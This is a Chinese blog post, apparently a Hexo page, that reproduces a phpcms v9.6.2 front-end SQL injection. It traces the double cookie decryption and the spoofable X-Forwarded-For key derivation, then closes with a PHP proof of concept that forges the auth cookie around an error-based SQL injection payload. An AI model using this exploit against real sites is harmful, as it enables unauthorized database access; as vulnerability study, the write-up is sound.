@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    }
+  };
+</script>
+
+  <meta name="description" content="前言phpcmsv9.6.2mysql+php5.6ubuntu 19 漏洞分析此版本的phpcms中存在任意文件下载漏洞，通过这个漏洞，我们可以读取到这套cms的密钥，利用密钥伪造cookie,进行sql注入。 定位modules/member/index.php12345678class index extends foreground &amp;#123;	private $times_db;		f">
+<meta name="keywords" content="root">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcmsv9前台sql注入[复现]">
+<meta property="og:url" content="http://yoursite.com/2019/07/23/phpcmsv9前台sql注入-复现/index.html">
+<meta property="og:site_name" content="The clown is laughing at you">
+<meta property="og:description" content="前言phpcmsv9.6.2mysql+php5.6ubuntu 19 漏洞分析此版本的phpcms中存在任意文件下载漏洞，通过这个漏洞，我们可以读取到这套cms的密钥，利用密钥伪造cookie,进行sql注入。 定位modules/member/index.php12345678class index extends foreground &amp;#123;	private $times_db;		f">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/phpcmsv9前台sql注入-复现/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/phpcmsv9前台sql注入-复现/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/phpcmsv9前台sql注入-复现/3.png">
+<meta property="og:updated_time" content="2019-07-23T15:20:00.414Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcmsv9前台sql注入[复现]">
+<meta name="twitter:description" content="前言phpcmsv9.6.2mysql+php5.6ubuntu 19 漏洞分析此版本的phpcms中存在任意文件下载漏洞，通过这个漏洞，我们可以读取到这套cms的密钥，利用密钥伪造cookie,进行sql注入。 定位modules/member/index.php12345678class index extends foreground &amp;#123;	private $times_db;		f">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/23/phpcmsv9前台sql注入-复现/2.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/07/23/phpcmsv9前台sql注入-复现/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>phpcmsv9前台sql注入[复现] | The clown is laughing at you</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">The clown is laughing at you</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/23/phpcmsv9前台sql注入-复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cookie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/name.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The clown is laughing at you">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpcmsv9前台sql注入[复现]
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-07-23 18:15:18 / Geändert am: 23:20:00" itemprop="dateCreated datePublished" datetime="2019-07-23T18:15:18+08:00">2019-07-23</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9.6.2<br>mysql+php5.6<br>ubuntu 19</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>此版本的phpcms中存在任意文件下载漏洞，通过这个漏洞，我们可以读取到这套cms的密钥，利用密钥伪造cookie,进行sql注入。</p>
+<p>定位modules/member/index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> <span class="keyword">extends</span> <span class="title">foreground</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> $times_db;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::__construct();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;http_user_agent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>继承父类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">parent</span>::__construct();</span><br></pre></td></tr></table></figure></p>
+<p>进入父类foreground类的__construct();<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">self</span>::check_ip();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'member_model'</span>);</span><br><span class="line">		<span class="comment">//ajax验证信息不需要登录</span></span><br><span class="line">		<span class="keyword">if</span>(substr(ROUTE_A, <span class="number">0</span>, <span class="number">7</span>) != <span class="string">'public_'</span>) &#123;</span><br><span class="line">			<span class="keyword">self</span>::check_member();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>进入check_member()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_member</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$phpcms_auth = param::get_cookie(<span class="string">'auth'</span>);</span><br><span class="line">		<span class="keyword">if</span>(ROUTE_M ==<span class="string">'member'</span> &amp;&amp; ROUTE_C ==<span class="string">'index'</span> &amp;&amp; in_array(ROUTE_A, <span class="keyword">array</span>(<span class="string">'login'</span>, <span class="string">'register'</span>, <span class="string">'mini'</span>,<span class="string">'send_newmail'</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> ($phpcms_auth &amp;&amp; ROUTE_A != <span class="string">'mini'</span>) &#123;</span><br><span class="line">				showmessage(L(<span class="string">'login_success'</span>, <span class="string">''</span>, <span class="string">'member'</span>), <span class="string">'index.php?m=member&amp;c=index'</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//判断是否存在auth cookie</span></span><br><span class="line">			<span class="keyword">if</span> ($phpcms_auth) &#123;</span><br><span class="line">				$auth_key = $auth_key = get_auth_key(<span class="string">'login'</span>);<span class="comment">//</span></span><br><span class="line">				<span class="keyword">list</span>($userid, $password) = explode(<span class="string">"\t"</span>, sys_auth($phpcms_auth, <span class="string">'DECODE'</span>, $auth_key));</span><br><span class="line">				<span class="comment">//验证用户，获取用户信息</span></span><br><span class="line">				<span class="keyword">$this</span>-&gt;memberinfo = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'userid'</span>=&gt;$userid));</span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;memberinfo[<span class="string">'islock'</span>]) <span class="keyword">exit</span>(<span class="string">'&lt;h1&gt;Bad Request!&lt;/h1&gt;'</span>);</span><br><span class="line">				<span class="comment">//获取用户模型信息</span></span><br><span class="line">				<span class="keyword">$this</span>-&gt;db-&gt;set_model(<span class="keyword">$this</span>-&gt;memberinfo[<span class="string">'modelid'</span>]);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">$this</span>-&gt;_member_modelinfo = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'userid'</span>=&gt;$userid));</span><br><span class="line">				<span class="keyword">$this</span>-&gt;_member_modelinfo = <span class="keyword">$this</span>-&gt;_member_modelinfo ? <span class="keyword">$this</span>-&gt;_member_modelinfo : <span class="keyword">array</span>();</span><br><span class="line">				<span class="keyword">$this</span>-&gt;db-&gt;set_model();</span><br><span class="line">				<span class="keyword">if</span>(is_array(<span class="keyword">$this</span>-&gt;memberinfo)) &#123;</span><br><span class="line">					<span class="keyword">$this</span>-&gt;memberinfo = array_merge(<span class="keyword">$this</span>-&gt;memberinfo, <span class="keyword">$this</span>-&gt;_member_modelinfo);</span><br><span class="line">				&#125;</span><br><span class="line">				....</span><br><span class="line">				....</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>触发点位于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;memberinfo = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'userid'</span>=&gt;$userid));</span><br></pre></td></tr></table></figure></p>
+<p>其中$userid未经过滤便传入get_one()函数，导致sql注入，然后最有意思的地方来了。看过POC之后，我试图寻找伪造cookie的方法…..找了很久…..我也是很无奈，聊一聊思路</p>
+<p>首先<code>$phpcms_auth = param::get_cookie(&#39;auth&#39;);</code>,然后跟进函数get_cookie(‘auth’),看一眼<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cookie</span><span class="params">($var, $default = <span class="string">''</span>)</span> </span>&#123;<span class="comment">//$var=auth</span></span><br><span class="line">		$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;<span class="comment">//$var=ZffIO_autl  </span></span><br><span class="line">		$value = <span class="keyword">isset</span>($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], <span class="string">'DECODE'</span>) : $default;</span><br><span class="line">		<span class="keyword">if</span>(in_array($var,<span class="keyword">array</span>(<span class="string">'_userid'</span>,<span class="string">'userid'</span>,<span class="string">'siteid'</span>,<span class="string">'_groupid'</span>,<span class="string">'_roleid'</span>))) &#123;</span><br><span class="line">			$value = intval($value);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(in_array($var,<span class="keyword">array</span>(<span class="string">'_username'</span>,<span class="string">'username'</span>,<span class="string">'_nickname'</span>,<span class="string">'admin_username'</span>,<span class="string">'sys_lang'</span>))) &#123; </span><br><span class="line">			$value = safe_replace($value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>cookie_pre是系统设定的cookie前缀.这个函数主要用于获取ZffIO_autl的cookie值，这里最重要的代码就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = <span class="keyword">isset</span>($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], <span class="string">'DECODE'</span>) : $default;</span><br></pre></td></tr></table></figure></p>
+<p>之前分析过sys_auth()函数，这是phpcms内置的一个加解密函数，在未指定情况下，会默认使用系统的密钥，<br><img src="/2019/07/23/phpcmsv9前台sql注入-复现/2.png" alt=""></p>
+<p>这里是对’ZffIO_auth’进行第一次，解密，这次的解密使用的密钥是<strong>系统的密钥</strong>，通过文件下载漏洞获取。</p>
+<p>回头看check_member()，返回的cookie值传入$phpcms_auth，作为进入if内代码体的先决条件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($phpcms_auth) &#123;</span><br><span class="line">				$auth_key = $auth_key = get_auth_key(<span class="string">'login'</span>);<span class="comment">//</span></span><br><span class="line">				<span class="keyword">list</span>($userid, $password) = explode(<span class="string">"\t"</span>, sys_auth($phpcms_auth, <span class="string">'DECODE'</span>, $auth_key));</span><br><span class="line">				<span class="comment">//验证用户，获取用户信息</span></span><br><span class="line">				<span class="keyword">$this</span>-&gt;memberinfo = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'userid'</span>=&gt;$userid));</span><br></pre></td></tr></table></figure></p>
+<p><strong>$userid来自$phpcms_auth，而$phpcms_auth来自上一步ZFFIO_auth解码的结果</strong>，这里进行第二次解密，看一下此次解密所使用的的密钥$auth_key<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$auth_key = $auth_key = get_auth_key(<span class="string">'login'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>跟进函数get_auth_key()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_auth_key</span><span class="params">($prefix,$suffix=<span class="string">""</span>)</span> </span>&#123;<span class="comment">//$prefix = 'login'</span></span><br><span class="line">	<span class="keyword">if</span>($prefix==<span class="string">'login'</span>)&#123;</span><br><span class="line">		$pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).ip());</span><br><span class="line">	&#125;</span><br><span class="line">	.... ....</span><br><span class="line">	.... ....</span><br><span class="line">	$authkey = md5($prefix.$pc_auth_key);</span><br><span class="line">	<span class="keyword">return</span> $authkey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>因为跟进函数ip()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">		$ip = getenv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> preg_match ( <span class="string">'/[\d\.]&#123;7,15&#125;/'</span>, $ip, $matches ) ? $matches [<span class="number">0</span>] : <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以通过指定X_Forwarded_For的值来获取ip地址。这个ip所以是我们可控的<br>所以$auth_key=md5(‘login’.md5(auth_key.X_Forwarded_For))，也就是本次解密使用的密钥，通过两次解密，数据赋值给$userid。<br>整个解密过程如下图<br><img src="/2019/07/23/phpcmsv9前台sql注入-复现/1.png" alt=""></p>
+<p>根据分析我们写出POC，我们写出逆过程，伪造cookie<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authkey</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $auth_key = <span class="string">'xxxxxxxx'</span>;<span class="comment">//系统给定密钥</span></span><br><span class="line">    $ip = <span class="string">'x.x.x.x'</span>;<span class="comment">//伪造的IP</span></span><br><span class="line">    $pc_auth_key = md5($auth_key.$ip);</span><br><span class="line">    $prefix = <span class="string">'login'</span>;</span><br><span class="line">    $authkey = md5($prefix.$pc_auth_key);</span><br><span class="line">    <span class="keyword">return</span> $authkey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sys_auth</span><span class="params">($string, $operation = <span class="string">'ENCODE'</span>, $key = <span class="string">''</span>, $expiry = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">    $ckey_length = <span class="number">4</span>;</span><br><span class="line">    $key = md5($key != <span class="string">''</span> ? $key : pc_base::load_config(<span class="string">'system'</span>, <span class="string">'auth_key'</span>));</span><br><span class="line">    $keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    $keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    $keyc = $ckey_length ? ($operation == <span class="string">'DECODE'</span> ? substr($string, <span class="number">0</span>, $ckey_length): substr(md5(microtime()), -$ckey_length)) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">    $key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">    $string = $operation == <span class="string">'DECODE'</span> ? base64_decode(strtr(substr($string, $ckey_length), <span class="string">'-_'</span>, <span class="string">'+/'</span>)) : sprintf(<span class="string">'%010d'</span>, $expiry ? $expiry + time() : <span class="number">0</span>).substr(md5($string.$keyb), <span class="number">0</span>, <span class="number">16</span>).$string;</span><br><span class="line">    $string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    $box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">    $rndkey = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">        $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">        $j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$i];</span><br><span class="line">        $box[$i] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">        $a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        $j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$a];</span><br><span class="line">        $box[$a] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($operation == <span class="string">'DECODE'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>).$keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $keyc.rtrim(strtr(base64_encode($result), <span class="string">'+/'</span>, <span class="string">'-_'</span>), <span class="string">'='</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//恶意代码</span></span><br><span class="line">$sql=<span class="string">'1%27%20and%20%28extractvaule%281%2Cconcat%280x7e%2C%28select%20user%28%29%29%2C0x7e%29%29%29%3B%23'</span>;</span><br><span class="line">$key=authkey();<span class="comment">//获取第二步加密操作所使用的密钥</span></span><br><span class="line">$encript_first_source=sys_auth($sql,<span class="string">'ENCODE'</span>,$key);<span class="comment">//第一次加密，对应源代码中第二次解密</span></span><br><span class="line">$system_key=<span class="string">'xxxxxxx'</span>;<span class="comment">//系统给定密钥</span></span><br><span class="line">$encript_second_source=sys_auth($encript_first_source,<span class="string">'ENCODE'</span>,$system_key);<span class="comment">//第二次加密，对应源代码中第一次解密，</span></span><br><span class="line"><span class="keyword">echo</span> $encript_second_source;<span class="comment">//获取最终密文，即ZFFIO_auth的cookie值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./index.php?m=member&amp;c=index&amp;siteid=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">发送请求，并且cookie中</span><br><span class="line">cookie: ZFFIO_auth=$encript_second_source</span><br></pre></td></tr></table></figure></p>
